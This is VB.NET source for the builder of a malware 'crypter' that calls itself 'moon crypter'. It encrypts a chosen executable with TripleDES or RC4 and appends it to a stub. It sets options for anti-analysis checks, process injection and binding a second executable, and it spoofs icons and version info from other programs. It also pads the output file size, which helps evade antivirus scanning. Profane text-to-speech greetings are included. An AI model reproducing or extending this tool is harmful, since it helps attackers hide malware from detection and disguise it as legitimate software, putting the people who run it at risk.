Imports System.IO
Imports System.Text

Public Class Form1
    Dim ifile, res, enctype, antis, processZ, cfile, bfile, b1file, iSbinded As String
    Dim output As String = Application.StartupPath + "\done.exe"
    Dim Stub As String = Application.StartupPath + "\winini.exe"


    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnCtypt.Click

        If File.Exists(output) Then
            Kill(output)
        End If

        File.Copy(Application.StartupPath + "\res\winini.exe", Stub)

        If CheckAntis.Checked Then
            antis = "true"
        Else
            antis = "false"
        End If

        If CheckInject.Checked Then
            processZ = TextEnc.Text
        Else
            processZ = "own"
        End If

        If CheckIcon.Checked Then
            Call IconIt(TextIcon.Text)
        End If
        If CheckClone.Checked Then
            Call CloneIt(TextClone.Text)
        End If

        Call cit()

        File.Delete(Stub)

        If CheckBytes.Checked Then
            Dim file1 = File.OpenWrite(Application.StartupPath + "\done.exe")
            Dim siza = file1.Seek(0, SeekOrigin.[End])
            Dim size = Convert.ToInt32(TextBytes.Text)
            Dim bite As Decimal = size * 1048576
            While siza < bite
                siza += 1
                file1.WriteByte(0)
            End While
            file1.Close()
        End If
        CreateObject("SAPI.SpVoice").Speak("File Crypted Succesfully dirty bastard")
        MsgBox("File Crypted Succesfully", MsgBoxStyle.Information, "Success")
    End Sub

    Private Sub IconIt(ByVal SourceIcon As String)
        Shell(App_Path() & "res\\res.exe -addoverwrite " & Stub & ", " & Stub & ", " & SourceIcon & ", " & "icongroup, 1,0")
    End Sub
    Private Sub CloneIt(ByVal SourceFile As String)
        Shell(App_Path() & "res\\res.exe -extract " & SourceFile & "," & App_Path() & "res\\info.res" & ",VERSIONINFO,,")
        Shell(App_Path() & "res\\res.exe -delete " & Stub & "," & App_Path() + "res\\res.exe" & ",VERSIONINFO,,")
        Shell(App_Path() & "res\\res.exe -addoverwrite " & Stub & "," & Stub & "," & App_Path() & "res\\info.res" & ",VERSIONINFO,1,")
    End Sub
    Public Function App_Path() As String
        Return System.AppDomain.CurrentDomain.BaseDirectory()
    End Function

    Private Sub cit()
        Dim key As String = TextEnc.Text
        Dim Cut As String = "/Assembly/"
        'get stub
        FileOpen(1, Stub, OpenMode.Binary)
        res = Space(LOF(1))
        FileGet(1, res)
        FileClose(1)

        'get file to crypt
        FileOpen(1, (TextFile.Text), OpenMode.Binary)
        ifile = Space(LOF(1))
        FileGet(1, ifile)
        FileClose(1)

        'get file to bind
        If CheckBind.Checked Then
            iSbinded = "yes"
            FileOpen(1, (TextBind.Text), OpenMode.Binary)
            bfile = Space(LOF(1))
            FileGet(1, bfile)
            FileClose(1)
            b1file = bfile
            If CheckDES.Checked Then
                b1file = _3des.Encrypt(bfile, key, True)
            ElseIf CheckRC4.Checked Then
                b1file = rc4.rc4(bfile, key)
            End If
        End If

        cfile = ifile
        If CheckDES.Checked Then
            enctype = "tripleDES"
            cfile = _3des.Encrypt(ifile, key, True)
        ElseIf CheckRC4.Checked Then
            enctype = "rc4"
            cfile = rc4.rc4(ifile, key)
        End If

        FileOpen(1, output, OpenMode.Binary)
        FilePut(1, res)
        FilePut(1, Cut)
        FilePut(1, cfile)
        FilePut(1, Cut)
        FilePut(1, key)
        FilePut(1, Cut)
        FilePut(1, enctype)
        FilePut(1, Cut)
        FilePut(1, antis)
        FilePut(1, Cut)
        FilePut(1, processZ)
        FilePut(1, Cut)
        FilePut(1, iSbinded)
        FilePut(1, Cut)
        FilePut(1, b1file)
        FilePut(1, Cut)
        FileClose(1)
    End Sub


    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnBrowse.Click
        With OpenFileDialog1
            .FileName = ""
            .Filter = "Executable(*.exe)|*.exe"
            .ShowDialog()
            TextFile.Text = .FileName
            ifile = TextFile.Text
        End With
    End Sub

    Private Sub BtnIcon_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnIcon.Click
        With OpenFileDialog1
            .FileName = ""
            .Filter = "Icons(*.ico)|*.ico"
            .ShowDialog()
            TextIcon.Text = .FileName
        End With
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim myfkey As String = GetRandom.ToString
        TextEnc.Text = myfkey
        CreateObject("SAPI.SpVoice").Speak("Welcome to moon crypter motherfucker")
    End Sub

    Public Function RandomNumber(ByVal min As Integer, ByVal max As Integer) As Integer
        Dim random As New Random()
        Return random.Next(min, max)
    End Function

    Public Function RandomString(ByVal size As Integer, ByVal lowerCase As Boolean) As String
        Dim builder As New StringBuilder()
        Dim random As New Random()
        Dim ch As Char
        Dim i As Integer
        For i = 0 To size - 1
            ch = Convert.ToChar(Convert.ToInt32((26 * random.NextDouble() + 65)))
            builder.Append(ch)
        Next i
        If lowerCase Then
            Return builder.ToString().ToLower()
        End If
        Return builder.ToString()
    End Function

    Public Function GetRandom() As String
        Dim builder As New StringBuilder()
        builder.Append(RandomString(4, True))
        builder.Append(RandomNumber(1000, 9999))
        builder.Append(RandomString(2, False))
        Return builder.ToString()
    End Function


    Private Sub BtnClone_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnClone.Click
        With OpenFileDialog1
            .FileName = ""
            .Filter = "Executable(*.exe)|*.exe"
            .ShowDialog()
            TextClone.Text = .FileName
        End With
    End Sub

    Private Sub BtnBind_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnBind.Click
        With OpenFileDialog1
            .FileName = ""
            .Filter = "Executable(*.exe)|*.exe"
            .ShowDialog()
            TextBind.Text = .FileName
        End With
    End Sub
End Class
